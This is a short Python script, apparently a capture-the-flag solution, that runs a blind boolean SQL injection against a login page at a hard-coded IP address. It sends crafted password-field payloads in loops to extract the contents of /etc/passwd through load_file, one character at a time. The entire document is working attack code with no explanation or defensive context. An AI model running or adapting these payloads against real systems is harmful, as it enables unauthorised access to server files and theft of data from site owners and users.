#!/usr/bin/python

import requests
table = "!#$%&()*+,-./ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`\x00"
query = "(select(load_file('/etc/passwd'))from(mem)"
for lmt in range(0,4):
    res = ''
    for i in range(0, 30):
        payload = "'||length(%s/**/limit/**/%d,1))=%d&&''='" %(query, lmt, i)
        aa = requests.get('http://1.224.175.21:13280/login_proc.php', params={'id':'helloman', 'pw':payload}).text
        #print aa
        if 'helloman' in aa:
            print res
            break
        aa = requests.get('http://1.224.175.21:13280/login_proc.php', params={'id':'helloman', 'pw':payload}).text
        for asc in range(0, len(table)):
            payload = "'||right(left(%s/**/limit/**/%d,1),%d),1)='%s'&&''='" %(query, lmt, i+1, table[asc])
            aa = requests.get('http://1.224.175.21:13280/login_proc.php', params={'id':'helloman', 'pw':payload}).text
            
            if 'helloman' in aa:
                res += table[asc]
                print res
                break